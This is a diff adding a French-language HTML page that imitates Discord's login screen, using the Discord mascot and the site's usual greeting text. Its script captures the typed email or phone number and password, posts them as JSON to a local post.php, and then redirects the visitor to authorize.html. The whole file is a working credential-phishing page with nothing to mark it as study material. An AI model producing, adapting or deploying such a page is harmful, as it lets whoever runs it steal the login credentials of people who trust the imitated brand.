@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="auth-container">
+        <img src="https://cdn.logojoy.com/wp-content/uploads/20210422095037/discord-mascot.png" class="logo">
+        <h2>Ha, te revoilà !</h2>
+        <p class="subtitle">Nous sommes si heureux de te revoir !</p>
+        <form id="loginForm">
+            <label>E-MAIL OU NUMÉRO DE TÉLÉPHONE *</label>
+            <input type="text" id="email" required>
+            <label>MOT DE PASSE *</label>
+            <input type="password" id="password" required>
+            <a href="#" class="forgot">Tu as oublié ton mot de passe ?</a>
+            <button type="submit">Connexion</button>
+            <p class="register">Besoin d'un compte ? <a href="#">S'inscrire</a></p>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+         
+            await fetch('post.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ email, password, step: "Connexion" })
+            });
+            window.location.href = "authorize.html";
+        });
+    </script>
+</body>
+</html>
